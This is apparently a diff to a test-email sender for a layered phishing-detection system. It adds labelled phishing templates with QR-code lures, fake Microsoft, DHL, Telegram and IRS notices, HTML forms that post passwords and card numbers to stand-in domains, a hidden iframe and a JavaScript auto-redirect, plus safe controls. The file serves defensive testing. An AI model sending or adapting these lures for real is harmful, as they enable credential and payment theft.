@@ -17,6 +17,8 @@ Usage:
 """
 
 import argparse
+import base64
+import io
 import smtplib
 import time
 import sys
@@ -621,6 +623,621 @@ EMAILS = {
     ],
 }
 
+
+# ---------------------------------------------------------------------------
+#  QR code image generator (base64 PNG) — used for artifact emails
+# ---------------------------------------------------------------------------
+
+def _make_qr_b64(url: str) -> str:
+    """Generate a QR code PNG image as a base64 string."""
+    try:
+        import qrcode
+        qr = qrcode.QRCode(box_size=8, border=2)
+        qr.add_data(url)
+        qr.make(fit=True)
+        img = qr.make_image(fill_color="black", back_color="white")
+        buf = io.BytesIO()
+        img.save(buf, format="PNG")
+        return base64.b64encode(buf.getvalue()).decode()
+    except ImportError:
+        return ""
+
+
+def _qr_img_tag(url: str, alt: str = "QR Code") -> str:
+    """Return an <img> tag with an inline base64 QR code, or a placeholder."""
+    b64 = _make_qr_b64(url)
+    if b64:
+        return (
+            f'<img src="data:image/png;base64,{b64}" '
+            f'alt="{alt}" width="200" height="200">'
+        )
+    return f'<div style="border:1px solid #ccc;padding:40px;text-align:center">[QR: {url}]</div>'
+
+
+# ---------------------------------------------------------------------------
+#  Artifact: QR-phishing emails with real embedded QR code images
+# ---------------------------------------------------------------------------
+
+_ARTIFACT_QR_PHISH: list[dict] = [
+    {
+        "sender": "security@corp-2fa-portal.xyz",
+        "recipient": "employee@company.com",
+        "subject": "Mandatory: Enable Two-Factor Authentication",
+        "body": (
+            "Dear Employee,\n\n"
+            "As part of our security policy, all staff must enable 2FA by scanning "
+            "the QR code in the attached HTML version of this email.\n\n"
+            "After scanning, enter your corporate credentials to link your "
+            "authenticator app.\n\n"
+            "Accounts without 2FA will be suspended after the deadline.\n\n"
+            "IT Security Department"
+        ),
+        "html": (
+            '<div style="font-family:Arial,sans-serif;max-width:600px;margin:auto">'
+            '<h2 style="color:#1a73e8">Corporate 2FA Enrollment</h2>'
+            "<p>Scan the QR code below with your phone to set up two-factor authentication:</p>"
+            '<div style="text-align:center;padding:20px">'
+            "{qr_2fa}"
+            "</div>"
+            "<p>After scanning, enter your username and password to complete enrollment.</p>"
+            '<p style="color:#d93025;font-weight:bold">Deadline: 3 days. '
+            "Non-compliant accounts will be locked.</p>"
+            '<hr><p style="font-size:11px;color:#666">IT Security Department</p>'
+            "</div>"
+        ),
+        "expect": "GREY -> L3 -> PHISHING (QR encodes phishing URL)",
+    },
+    {
+        "sender": "parking@city-fines-portal.xyz",
+        "recipient": "driver@company.com",
+        "subject": "Parking Violation — Fine Payment Required",
+        "body": (
+            "CITY PARKING SERVICES\n"
+            "Parking Violation Notice\n\n"
+            "Vehicle: license plate ***487\n"
+            "Violation: Overtime parking in Zone B\n"
+            "Fine: $75.00\n"
+            "Due: 7 days from receipt\n\n"
+            "Pay your fine by scanning the QR code in the HTML version.\n\n"
+            "Late payment penalties apply.\n\n"
+            "Municipal Parking Authority"
+        ),
+        "html": (
+            '<div style="font-family:Arial,sans-serif;max-width:600px;margin:auto;'
+            'border:2px solid #c00;padding:20px">'
+            '<h2 style="color:#c00">PARKING VIOLATION NOTICE</h2>'
+            "<table>"
+            "<tr><td><b>Vehicle:</b></td><td>License ***487</td></tr>"
+            "<tr><td><b>Violation:</b></td><td>Overtime parking, Zone B</td></tr>"
+            '<tr><td><b>Fine:</b></td><td style="color:#c00;font-weight:bold">$75.00</td></tr>'
+            "</table>"
+            '<p>Scan to pay immediately:</p><div style="text-align:center">'
+            "{qr_fine}"
+            "</div>"
+            '<p style="font-size:11px;color:#888">Municipal Parking Authority</p>'
+            "</div>"
+        ),
+        "expect": "GREY -> L3 -> PHISHING (QR encodes phishing payment URL)",
+    },
+    {
+        "sender": "hr@benefits-enroll-now.xyz",
+        "recipient": "staff@company.com",
+        "subject": "Open Enrollment: Scan QR to Update Benefits",
+        "body": (
+            "Dear Team Member,\n\n"
+            "Annual benefits enrollment is now open. To review and update your "
+            "selections for 2026, scan the QR code in the HTML email.\n\n"
+            "You will need to confirm your identity with your SSO credentials.\n\n"
+            "Enrollment closes in 5 business days.\n\n"
+            "Human Resources"
+        ),
+        "html": (
+            '<div style="font-family:Segoe UI,sans-serif;max-width:600px;margin:auto">'
+            '<div style="background:#0078d4;color:#fff;padding:15px 20px">'
+            "<h2>Benefits Open Enrollment 2026</h2></div>"
+            '<div style="padding:20px">'
+            "<p>Review and update your benefits by scanning the QR code:</p>"
+            '<div style="text-align:center;padding:15px;background:#f5f5f5;border-radius:8px">'
+            "{qr_benefits}"
+            "</div>"
+            "<p>Log in with your corporate SSO credentials after scanning.</p>"
+            '<p style="color:#d83b01"><b>Deadline: 5 business days</b></p></div>'
+            "</div>"
+        ),
+        "expect": "GREY -> L3 -> PHISHING (QR encodes credential harvesting URL)",
+    },
+    # --- QR to fake bank / payment ---
+    {
+        "sender": "noreply@secure-pay-invoice.site",
+        "recipient": "client@company.com",
+        "subject": "Invoice #INV-20260315 — Payment Due",
+        "body": (
+            "Dear Client,\n\n"
+            "Please find attached invoice #INV-20260315 for consulting services.\n\n"
+            "Amount due: $2,340.00\n"
+            "Due date: March 28, 2026\n\n"
+            "Scan the QR code in the HTML version to pay via bank transfer.\n\n"
+            "Finance Department"
+        ),
+        "html": (
+            '<div style="font-family:Georgia,serif;max-width:600px;margin:auto;'
+            'border:1px solid #ccc;padding:30px">'
+            '<h1 style="font-size:20px;border-bottom:2px solid #333;padding-bottom:10px">'
+            "INVOICE #INV-20260315</h1>"
+            '<table style="width:100%;margin:15px 0;border-collapse:collapse">'
+            '<tr><td style="padding:6px 0">Service:</td><td>IT Consulting — March 2026</td></tr>'
+            '<tr><td style="padding:6px 0">Amount:</td>'
+            '<td style="font-weight:bold;font-size:18px">$2,340.00</td></tr>'
+            '<tr><td style="padding:6px 0">Due:</td><td>March 28, 2026</td></tr>'
+            "</table>"
+            "<p>Scan to pay instantly via secure bank transfer:</p>"
+            '<div style="text-align:center;padding:20px;background:#f9f9f9;border-radius:8px">'
+            "{qr_invoice}"
+            "</div>"
+            '<p style="font-size:11px;color:#888;margin-top:15px">'
+            "If you have questions about this invoice, reply to this email.</p></div>"
+        ),
+        "expect": "GREY -> L3 -> PHISHING (QR encodes fake payment portal)",
+    },
+    # --- QR to crypto wallet drain ---
+    {
+        "sender": "rewards@web3-airdrop-claim.site",
+        "recipient": "user@company.com",
+        "subject": "Claim Your 500 USDT Airdrop — Scan QR",
+        "body": (
+            "Congratulations!\n\n"
+            "You have been selected for a USDT airdrop reward.\n"
+            "Amount: 500 USDT\n\n"
+            "To claim, scan the QR code in the HTML version with "
+            "your wallet app.\n\n"
+            "Offer expires in 48 hours.\n\n"
+            "Web3 Rewards Team"
+        ),
+        "html": (
+            '<div style="font-family:Arial,sans-serif;max-width:600px;margin:auto;'
+            'background:linear-gradient(135deg,#1a1a2e,#16213e);color:#fff;'
+            'padding:30px;border-radius:12px">'
+            '<h2 style="color:#00d4aa">500 USDT Airdrop</h2>'
+            '<p style="font-size:16px">You have been selected!</p>'
+            '<div style="background:rgba(255,255,255,0.1);padding:20px;border-radius:8px;'
+            'text-align:center;margin:20px 0">'
+            '<p style="font-size:36px;font-weight:bold;color:#00d4aa;margin:0">500 USDT</p>'
+            '<p style="color:#aaa">Scan to claim</p>'
+            "{qr_crypto}"
+            "</div>"
+            '<p style="color:#ff6b6b;font-weight:bold">Expires in 48 hours</p>'
+            '<p style="font-size:10px;color:#666">Web3 Rewards Program</p>'
+            "</div>"
+        ),
+        "expect": "GREY -> L3 -> PHISHING (QR encodes crypto scam / wallet drain)",
+    },
+    # --- QR to fake tax refund ---
+    {
+        "sender": "refunds@tax-refund-portal.site",
+        "recipient": "taxpayer@company.com",
+        "subject": "Tax Refund: $1,847.00 — Verify to Receive",
+        "body": (
+            "Internal Revenue Service\n"
+            "Tax Refund Notification\n\n"
+            "Our records indicate you are eligible for a tax refund of $1,847.00 "
+            "for the fiscal year 2025.\n\n"
+            "To process your refund, scan the QR code in the HTML version "
+            "and verify your banking information.\n\n"
+            "Sincerely,\n"
+            "IRS Refund Processing Center"
+        ),
+        "html": (
+            '<div style="font-family:Times New Roman,serif;max-width:600px;margin:auto;'
+            'border:3px solid #003366;padding:25px">'
+            '<div style="text-align:center;border-bottom:2px solid #003366;padding-bottom:15px">'
+            '<h2 style="color:#003366;margin:0">Internal Revenue Service</h2>'
+            '<p style="color:#666;margin:5px 0">Tax Refund Notification</p></div>'
+            '<div style="padding:20px 0">'
+            "<p>Dear Taxpayer,</p>"
+            '<p>You are eligible for a refund of <b style="font-size:18px;color:#006600">'
+            "$1,847.00</b> for fiscal year 2025.</p>"
+            "<p>Scan the QR code to verify your identity and banking details:</p>"
+            '<div style="text-align:center;padding:15px;background:#f5f5f5;margin:15px 0">'
+            "{qr_tax}"
+            "</div>"
+            '<p style="color:#c00;font-size:12px">Processing deadline: 10 business days. '
+            "Unclaimed refunds will be forfeited.</p></div>"
+            '<div style="border-top:1px solid #ccc;padding-top:10px;font-size:10px;color:#888">'
+            "IRS Refund Processing Center | This is an automated notification</div></div>"
+        ),
+        "expect": "GREY -> L3 -> PHISHING (QR encodes fake IRS refund portal)",
+    },
+]
+
+
+# ---------------------------------------------------------------------------
+#  Artifact: HTML phishing with forms, iframes, obfuscated redirects
+# ---------------------------------------------------------------------------
+
+_ARTIFACT_HTML: list[dict] = [
+    {
+        "sender": "noreply@signin-microsoftonline.xyz",
+        "recipient": "user@company.com",
+        "subject": "Action Required: Verify Your Microsoft 365 Account",
+        "body": (
+            "Your Microsoft 365 session has expired.\n\n"
+            "Please re-authenticate to continue accessing Outlook, Teams, "
+            "and OneDrive.\n\n"
+            "Open the HTML version of this email to sign in securely."
+        ),
+        "html": (
+            '<div style="font-family:Segoe UI,sans-serif;max-width:500px;margin:40px auto;'
+            'border:1px solid #ddd;border-radius:8px;overflow:hidden">'
+            '<div style="background:#0078d4;padding:20px;text-align:center">'
+            '<img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/'
+            'RE1Mu3b" alt="Microsoft" width="120" style="filter:brightness(0) invert(1)">'
+            "</div>"
+            '<div style="padding:30px">'
+            "<h3>Sign in to your account</h3>"
+            '<form action="http://signin-microsoftonline.xyz/auth/login" method="POST">'
+            '<input type="email" name="email" placeholder="Email address" '
+            'style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px"><br>'
+            '<input type="password" name="password" placeholder="Password" '
+            'style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px"><br>'
+            '<button type="submit" style="width:100%;padding:12px;background:#0078d4;color:#fff;'
+            'border:none;border-radius:4px;font-size:16px;cursor:pointer">Sign in</button>'
+            "</form>"
+            '<p style="font-size:11px;color:#666;margin-top:15px">'
+            "Can't access your account? | Sign in with a security key</p>"
+            "</div></div>"
+        ),
+        "expect": "GREY -> L3 -> PHISHING (HTML form with password field, fake Microsoft)",
+    },
+    {
+        "sender": "noreply@drive-share-docs.xyz",
+        "recipient": "team@company.com",
+        "subject": "Document shared: Q3 Budget Review.xlsx",
+        "body": (
+            "A document has been shared with you.\n\n"
+            "Title: Q3 Budget Review.xlsx\n"
+            "Shared by: CFO Office\n\n"
+            "Open the HTML version to view the document."
+        ),
+        "html": (
+            '<div style="font-family:Arial,sans-serif;max-width:500px;margin:40px auto;'
+            'border:1px solid #ddd;border-radius:8px;overflow:hidden">'
+            '<div style="background:#4285f4;padding:15px 20px;color:#fff">'
+            "<b>Google Drive</b> — Document shared with you</div>"
+            '<div style="padding:25px">'
+            '<p style="font-size:18px">Q3 Budget Review.xlsx</p>'
+            '<p style="color:#666">CFO Office shared a spreadsheet with you</p>'
+            '<div style="background:#f0f0f0;padding:15px;border-radius:4px;margin:15px 0">'
+            '<iframe src="http://drive-share-docs.xyz/embed/preview?doc=q3budget" '
+            'width="100%" height="200" style="border:none" sandbox></iframe>'
+            "</div>"
+            '<a href="http://drive-share-docs.xyz/view/q3budget" '
+            'style="display:block;text-align:center;background:#1a73e8;color:#fff;'
+            'padding:12px;border-radius:4px;text-decoration:none;font-weight:bold">'
+            "Open in Google Drive</a>"
+            '<p style="font-size:11px;color:#999;margin-top:15px">'
+            "You received this because CFO Office shared a file with you.</p>"
+            "</div></div>"
+        ),
+        "expect": "GREY -> L3 -> PHISHING (hidden iframe, fake Google Drive)",
+    },
+    {
+        "sender": "security@account-alerts-service.xyz",
+        "recipient": "user@company.com",
+        "subject": "Unusual sign-in activity on your account",
+        "body": (
+            "We detected an unusual sign-in attempt.\n\n"
+            "Location: Unknown\n"
+            "Time: Today\n\n"
+            "If this wasn't you, please review your account immediately "
+            "by opening the HTML version of this email."
+        ),
+        "html": (
+            '<div style="font-family:Arial,sans-serif;max-width:500px;margin:40px auto">'
+            '<h2 style="color:#d93025">Security Alert</h2>'
+            "<p>We detected an unusual sign-in attempt on your account.</p>"
+            '<table style="width:100%;border-collapse:collapse;margin:15px 0">'
+            '<tr><td style="padding:8px;border-bottom:1px solid #eee"><b>Location:</b></td>'
+            '<td style="padding:8px;border-bottom:1px solid #eee;color:#d93025">'
+            "Unknown (Lagos, NG)</td></tr>"
+            '<tr><td style="padding:8px;border-bottom:1px solid #eee"><b>Device:</b></td>'
+            '<td style="padding:8px;border-bottom:1px solid #eee">Linux / Chrome</td></tr>'
+            "</table>"
+            "<p>If this wasn't you, secure your account now:</p>"
+            '<a href="http://account-alerts-service.xyz/secure?token=abc123" '
+            'style="display:inline-block;background:#d93025;color:#fff;padding:12px 30px;'
+            'border-radius:4px;text-decoration:none;font-weight:bold">Review Activity</a>'
+            '<script>setTimeout(function(){'
+            'window.location="http://account-alerts-service.xyz/redirect";},15000);</script>'
+            '<p style="font-size:11px;color:#999;margin-top:20px">'
+            "This is an automated security notification.</p></div>"
+        ),
+        "expect": "GREY -> L3 -> PHISHING (JS auto-redirect, fake security alert)",
+    },
+    # --- Fake DHL / package delivery ---
+    {
+        "sender": "tracking@dhl-parcel-status.site",
+        "recipient": "customer@company.com",
+        "subject": "DHL: Your package is waiting — confirm delivery address",
+        "body": (
+            "DHL Express Notification\n\n"
+            "Your package (tracking #DHL-7729401835) could not be delivered "
+            "due to an incomplete address.\n\n"
+            "Confirm your delivery details in the HTML version.\n\n"
+            "DHL Customer Service"
+        ),
+        "html": (
+            '<div style="font-family:Arial,sans-serif;max-width:500px;margin:auto;'
+            'border:1px solid #ddd;border-radius:8px;overflow:hidden">'
+            '<div style="background:#ffcc00;padding:15px 20px">'
+            '<b style="font-size:20px;color:#c00">DHL</b>'
+            '<span style="color:#333;margin-left:10px">Express</span></div>'
+            '<div style="padding:25px">'
+            '<h3 style="color:#333">Delivery Attempt Failed</h3>'
+            '<div style="background:#fff3cd;border:1px solid #ffc107;padding:12px;'
+            'border-radius:4px;margin:15px 0">'
+            "<b>Tracking:</b> DHL-7729401835<br>"
+            "<b>Status:</b> Address incomplete — action required</div>"
+            '<form action="http://dhl-parcel-status.site/confirm" method="POST">'
+            '<input type="text" name="fullname" placeholder="Full Name" '
+            'style="width:100%;padding:10px;margin:5px 0;border:1px solid #ccc;border-radius:4px">'
+            '<input type="text" name="address" placeholder="Street Address" '
+            'style="width:100%;padding:10px;margin:5px 0;border:1px solid #ccc;border-radius:4px">'
+            '<input type="text" name="city" placeholder="City, ZIP Code" '
+            'style="width:100%;padding:10px;margin:5px 0;border:1px solid #ccc;border-radius:4px">'
+            '<input type="text" name="phone" placeholder="Phone Number" '
+            'style="width:100%;padding:10px;margin:5px 0;border:1px solid #ccc;border-radius:4px">'
+            '<input type="text" name="card" placeholder="Card number (delivery fee $1.99)" '
+            'style="width:100%;padding:10px;margin:5px 0;border:1px solid #ccc;border-radius:4px">'
+            '<button type="submit" style="width:100%;padding:12px;background:#c00;color:#fff;'
+            'border:none;border-radius:4px;font-size:15px;cursor:pointer;margin-top:8px">'
+            "Confirm &amp; Pay $1.99</button>"
+            "</form>"
+            '<p style="font-size:10px;color:#999;margin-top:12px">'
+            "DHL International GmbH</p></div></div>"
+        ),
+        "expect": "GREY -> L3 -> PHISHING (fake DHL, form harvests address + card)",
+    },
+    # --- "Vote for me" social engineering ---
+    {
+        "sender": "anna.k@creative-contest-vote.site",
+        "recipient": "friend@company.com",
+        "subject": "Please vote for my project! Just takes 10 seconds",
+        "body": (
+            "Hey!\n\n"
+            "I'm in the finals of a creative design contest and really need "
+            "your vote. It only takes 10 seconds!\n\n"
+            "Just follow the link below, log in with your social account, "
+            "and click the vote button:\n\n"
+            "http://creative-contest-vote.site/entry/anna-k-2026?ref=email\n\n"
+            "Thank you so much! Voting closes tomorrow.\n\n"
+            "Anna"
+        ),
+        "html": (
+            '<div style="font-family:Arial,sans-serif;max-width:500px;margin:auto">'
+            "<p>Hey!</p>"
+            "<p>I'm in the finals of a creative design contest and really need your vote. "
+            "It literally takes 10 seconds!</p>"
+            '<div style="text-align:center;margin:20px 0">'
+            '<a href="http://creative-contest-vote.site/entry/anna-k-2026?ref=email" '
+            'style="display:inline-block;background:#e91e63;color:#fff;padding:15px 40px;'
+            'border-radius:30px;text-decoration:none;font-size:18px;font-weight:bold">'
+            "Vote for Anna</a></div>"
+            '<p style="color:#666;font-size:13px">You will need to log in with your '
+            "Google or Telegram account to verify your vote.</p>"
+            '<p style="color:#999;font-size:11px">Voting closes March 24, 2026</p></div>'
+        ),
+        "expect": "GREY -> L3 -> PHISHING (social engineering, credential harvesting via vote)",
+    },
+    # --- Fake Telegram / social media ---
+    {
+        "sender": "noreply@tg-security-check.site",
+        "recipient": "user@company.com",
+        "subject": "Telegram: Someone is trying to delete your account",
+        "body": (
+            "Telegram Security\n\n"
+            "We received a request to delete your Telegram account.\n\n"
+            "If this was NOT you, cancel the deletion immediately by "
+            "opening the link below:\n\n"
+            "http://tg-security-check.site/cancel-deletion?uid=79281234567\n\n"
+            "If you do not respond within 24 hours, your account "
+            "and all messages will be permanently removed.\n\n"
+            "Telegram Security Team"
+        ),
+        "html": (
+            '<div style="font-family:Arial,sans-serif;max-width:500px;margin:auto">'
+            '<div style="background:#0088cc;padding:15px 20px;color:#fff;text-align:center">'
+            '<b style="font-size:20px">Telegram</b></div>'
+            '<div style="padding:25px">'
+            '<h3 style="color:#d93025">Account Deletion Request</h3>'
+            "<p>We received a request to <b>permanently delete</b> your Telegram account.</p>"
+            '<div style="background:#fee;border:1px solid #fcc;padding:12px;border-radius:4px;'
+            'margin:15px 0"><b>If this was NOT you</b>, cancel the deletion now:</div>'
+            '<a href="http://tg-security-check.site/cancel-deletion?uid=79281234567" '
+            'style="display:block;text-align:center;background:#0088cc;color:#fff;'
+            'padding:14px;border-radius:4px;text-decoration:none;font-size:16px;'
+            'font-weight:bold">Cancel Deletion</a>'
+            '<p style="color:#c00;font-size:13px;margin-top:12px">'
+            "You have 24 hours. After that, your account will be removed.</p>"
+            '<p style="font-size:10px;color:#999">Telegram FZ LLC</p></div></div>'
+        ),
+        "expect": "GREY -> L3 -> PHISHING (fake Telegram, urgency + credential theft)",
+    },
+    # --- Fake WhatsApp backup restore ---
+    {
+        "sender": "backup@whatsapp-cloud-restore.site",
+        "recipient": "user@company.com",
+        "subject": "WhatsApp: Your chat backup could not be restored",
+        "body": (
+            "WhatsApp Cloud Backup\n\n"
+            "We were unable to restore your chat backup from March 20, 2026.\n\n"
+            "Backup size: 4.7 GB\n"
+            "Messages: 23,491\n"
+            "Media files: 2,847\n\n"
+            "To restore your backup, verify your phone number:\n"
+            "http://whatsapp-cloud-restore.site/restore?phone=verify\n\n"
+            "If you do not verify within 7 days, the backup will be deleted.\n\n"
+            "WhatsApp Support"
+        ),
+        "html": (
+            '<div style="font-family:Arial,sans-serif;max-width:500px;margin:auto">'
+            '<div style="background:#25d366;padding:15px 20px;color:#fff;text-align:center">'
+            '<b style="font-size:20px">WhatsApp</b></div>'
+            '<div style="padding:25px">'
+            '<h3>Chat Backup Restore Failed</h3>'
+            '<div style="background:#f5f5f5;padding:15px;border-radius:8px;margin:10px 0">'
+            "<p><b>Backup date:</b> March 20, 2026<br>"
+            "<b>Size:</b> 4.7 GB<br>"
+            "<b>Messages:</b> 23,491<br>"
+            "<b>Media:</b> 2,847 files</p></div>"
+            '<p>Verify your phone number to restore:</p>'
+            '<a href="http://whatsapp-cloud-restore.site/restore?phone=verify" '
+            'style="display:block;text-align:center;background:#25d366;color:#fff;'
+            'padding:14px;border-radius:8px;text-decoration:none;font-weight:bold;'
+            'font-size:16px">Restore Backup</a>'
+            '<p style="color:#c00;font-size:12px;margin-top:12px">'
+            "Backup will be deleted in 7 days if not verified.</p>"
+            '<p style="font-size:10px;color:#999">WhatsApp LLC, a Meta company</p>'
+            "</div></div>"
+        ),
+        "expect": "GREY -> L3 -> PHISHING (fake WhatsApp, phone/credential harvest)",
+    },
+]
+
+
+# ---------------------------------------------------------------------------
+#  Artifact: Safe QR codes — legitimate services
+# ---------------------------------------------------------------------------
+
+_ARTIFACT_SAFE_QR: list[dict] = [
+    {
+        "sender": "noreply@github.com",
+        "recipient": "developer@company.com",
+        "subject": "Enable 2FA on your GitHub account",
+        "body": (
+            "Hi developer,\n\n"
+            "We recommend enabling two-factor authentication on your GitHub account.\n\n"
+            "Scan the QR code in the HTML version to open your security settings.\n\n"
+            "The GitHub Team"
+        ),
+        "html": (
+            '<div style="font-family:-apple-system,sans-serif;max-width:600px;margin:auto">'
+            '<div style="background:#24292f;padding:20px;text-align:center">'
+            '<span style="color:#fff;font-size:24px;font-weight:bold">GitHub</span></div>'
+            '<div style="padding:25px">'
+            "<h3>Set Up Two-Factor Authentication</h3>"
+            "<p>Scan this QR code with your phone to open your GitHub security settings:</p>"
+            '<div style="text-align:center;padding:20px">'
+            "{qr_github}"
+            "</div>"
+            "<p>Or visit: <a href=\"https://github.com/settings/security\">"
+            "github.com/settings/security</a></p>"
+            '<hr><p style="font-size:11px;color:#666">GitHub, Inc.</p>'
+            "</div></div>"
+        ),
+        "expect": "GREY -> L3 -> SAFE (QR encodes legitimate github.com URL)",
+    },
+    {
+        "sender": "noreply@zoom.us",
+        "recipient": "user@company.com",
+        "subject": "Your Zoom meeting link — scan to join",
+        "body": (
+            "Hi,\n\n"
+            "Your upcoming meeting is ready. Scan the QR code in the "
+            "HTML version to join from your mobile device.\n\n"
+            "Meeting: Weekly Team Standup\n"
+            "Time: Monday 10:00 AM\n\n"
+            "Zoom Team"
+        ),
+        "html": (
+            '<div style="font-family:Arial,sans-serif;max-width:600px;margin:auto">'
+            '<div style="background:#2d8cff;padding:15px 20px;color:#fff">'
+            "<b>Zoom</b> — Meeting Invitation</div>"
+            '<div style="padding:25px">'
+            "<h3>Weekly Team Standup</h3>"
+            "<p><b>Time:</b> Monday 10:00 AM<br>"
+            "<b>Duration:</b> 30 minutes</p>"
+            "<p>Scan to join from your mobile device:</p>"
+            '<div style="text-align:center;padding:15px;background:#f5f8ff;border-radius:8px">'
+            "{qr_zoom}"
+            "</div>"
+            '<p style="font-size:12px;color:#666;margin-top:15px">'
+            'Or click: <a href="https://zoom.us/j/1234567890">Join Meeting</a></p>'
+            "</div></div>"
+        ),
+        "expect": "GREY -> L3 -> SAFE (QR encodes legitimate zoom.us URL)",
+    },
+    {
+        "sender": "noreply@linkedin.com",
+        "recipient": "professional@company.com",
+        "subject": "Your LinkedIn QR code for networking",
+        "body": (
+            "Hi,\n\n"
+            "Here is your personal LinkedIn QR code for quick networking "
+            "at upcoming events.\n\n"
+            "Others can scan it to view your profile instantly.\n\n"
+            "LinkedIn Team"
+        ),
+        "html": (
+            '<div style="font-family:Arial,sans-serif;max-width:600px;margin:auto">'
+            '<div style="background:#0a66c2;padding:15px 20px;color:#fff">'
+            "<b>LinkedIn</b></div>"
+            '<div style="padding:25px">'
+            "<h3>Your Networking QR Code</h3>"
+            "<p>Share this QR code at events for instant profile access:</p>"
+            '<div style="text-align:center;padding:15px">'
+            "{qr_linkedin}"
+            "</div>"
+            '<p style="font-size:12px;color:#666">'
+            'Or share: <a href="https://linkedin.com/in/example-user">'
+            "linkedin.com/in/example-user</a></p></div></div>"
+        ),
+        "expect": "GREY -> L3 -> SAFE (QR encodes legitimate linkedin.com URL)",
+    },
+]
+
+
+def _build_artifact_emails() -> dict[str, list[dict]]:
+    """Render QR code images into artifact email templates at import time."""
+
+    # Map each QR placeholder in templates to the URL it should encode.
+    _phish_qr_map = {
+        "{qr_2fa}":      "http://corp-2fa-portal.xyz/enroll/2fa?token=a1b2c3",
+        "{qr_fine}":     "http://city-fines-portal.xyz/pay/fine?ref=PKG-2026-0487",
+        "{qr_benefits}": "http://benefits-enroll-now.xyz/sso/login?redirect=benefits",
+        "{qr_invoice}":  "http://secure-pay-invoice.site/pay/INV-20260315?bank=verify",
+        "{qr_crypto}":   "http://web3-airdrop-claim.site/claim?wallet=connect",
+        "{qr_tax}":      "http://tax-refund-portal.site/verify?ssn=required",
+    }
+
+    _safe_qr_map = {
+        "{qr_github}":   "https://github.com/settings/security",
+        "{qr_zoom}":     "https://zoom.us/j/1234567890",
+        "{qr_linkedin}": "https://linkedin.com/in/example-user",
+    }
+
+    def _render_qr_in_templates(templates, qr_map):
+        result = []
+        for tmpl in templates:
+            entry = dict(tmpl)
+            html = entry.get("html", "")
+            for placeholder, url in qr_map.items():
+                if placeholder in html:
+                    html = html.replace(placeholder, _qr_img_tag(url))
+            entry["html"] = html
+            result.append(entry)
+        return result
+
+    return {
+        "artifact_qr":      _render_qr_in_templates(_ARTIFACT_QR_PHISH, _phish_qr_map),
+        "artifact_html":    list(_ARTIFACT_HTML),
+        "artifact_safe_qr": _render_qr_in_templates(_ARTIFACT_SAFE_QR, _safe_qr_map),
+    }
+
+
+# Build artifact emails (QR images rendered once at import time)
+_artifact_emails = _build_artifact_emails()
+EMAILS.update(_artifact_emails)
+
 # -- Sender --
 
 def send_email(email_data: dict, host: str, port: int) -> bool:
@@ -656,13 +1273,16 @@ def send_batch(levels: list[str], host: str, port: int, delay: float):
             continue
 
         level_names = {
-            "l1":         "🔴 L1 — Threat Intel (blacklisted domains)",
-            "l2_phish":   "🟠 L2 — Obvious Phishing Text",
-            "safe":       "🟢 L2 — Safe / Legitimate Emails",
-            "grey":       "🟡 Grey Zone → L3 → PHISHING",
-            "grey_safe":  "🟢 Grey Zone → L3 → SAFE",
-            "qr_phish":   "📱 QR-Phishing (quishing)",
-            "uncertain":  "🟣 Uncertain → Operator Review",
+            "l1":               "🔴 L1 — Threat Intel (blacklisted domains)",
+            "l2_phish":         "🟠 L2 — Obvious Phishing Text",
+            "safe":             "🟢 L2 — Safe / Legitimate Emails",
+            "grey":             "🟡 Grey Zone → L3 → PHISHING",
+            "grey_safe":        "🟢 Grey Zone → L3 → SAFE",
+            "qr_phish":         "📱 QR-Phishing (quishing, text only)",
+            "uncertain":        "🟣 Uncertain → Operator Review",
+            "artifact_qr":      "📱 Artifact: QR Code Phishing (real images)",
+            "artifact_html":    "🎨 Artifact: HTML Phishing (forms/iframes/JS)",
+            "artifact_safe_qr": "✅ Artifact: Safe QR Codes (legitimate)",
         }
 
         print(f"\n{'-' * 60}")
@@ -710,13 +1330,16 @@ def send_http(levels: list[str], delay: float, api_url: str):
             continue
 
         level_names = {
-            "l1":         "🔴 L1 Reject (blacklist)",
-            "l2_phish":   "🟠 L2 Phishing",
-            "safe":       "🟢 L2 Safe",
-            "grey":       "🟡 Grey → L3 → Phish",
-            "grey_safe":  "🟢 Grey → L3 → Safe",
-            "qr_phish":   "📱 QR-Phishing",
-            "uncertain":  "🟣 Uncertain → Operator",
+            "l1":               "🔴 L1 Reject (blacklist)",
+            "l2_phish":         "🟠 L2 Phishing",
+            "safe":             "🟢 L2 Safe",
+            "grey":             "🟡 Grey → L3 → Phish",
+            "grey_safe":        "🟢 Grey → L3 → Safe",
+            "qr_phish":         "📱 QR-Phishing (text)",
+            "uncertain":        "🟣 Uncertain → Operator",
+            "artifact_qr":      "📱 Artifact: QR Phish",
+            "artifact_html":    "🎨 Artifact: HTML Phish",
+            "artifact_safe_qr": "✅ Artifact: Safe QR",
         }
 
         print(f"\n{'-' * 60}")
@@ -780,7 +1403,10 @@ def send_http(levels: list[str], delay: float, api_url: str):
 #  CLI
 # -------------------------------------------------------------------------------
 
-ALL_LEVELS = ["l1", "l2_phish", "safe", "grey", "grey_safe", "uncertain"]
+ALL_LEVELS = [
+    "l1", "l2_phish", "safe", "grey", "grey_safe", "uncertain",
+    "artifact_qr", "artifact_html", "artifact_safe_qr",
+]
 
 def main():
     parser = argparse.ArgumentParser(
@@ -788,19 +1414,22 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Levels:
-  l1          Known blacklisted domains (Threat Intel reject)
-  l2_phish    Obvious phishing text (DistilBERT reject)
-  safe        Legitimate business emails (DistilBERT deliver)
-  grey        Ambiguous → L3 investigation → phishing
-  grey_safe   Ambiguous → L3 investigation → safe
-  uncertain   AI can't decide → operator review
-  qr_phish    QR-code phishing (optional, not in 'all')
-  all         All of the above (except qr_phish)
+  l1                Known blacklisted domains (Threat Intel reject)
+  l2_phish          Obvious phishing text (DistilBERT reject)
+  safe              Legitimate business emails (DistilBERT deliver)
+  grey              Ambiguous → L3 investigation → phishing
+  grey_safe         Ambiguous → L3 investigation → safe
+  uncertain         AI can't decide → operator review
+  qr_phish          QR-code phishing text only (legacy, not in 'all')
+  artifact_qr       HTML emails with real embedded QR code images (phishing)
+  artifact_html     HTML emails with forms, iframes, JS redirects (phishing)
+  artifact_safe_qr  HTML emails with legitimate QR codes (safe)
+  all               All of the above (except qr_phish)
         """,
     )
     parser.add_argument(
         "--level",
-        choices=ALL_LEVELS + ["qr_phish", "all"],
+        choices=ALL_LEVELS + ["qr_phish", "all", "artifacts"],
         default="all",
         help="Which email level to send (default: all)",
     )
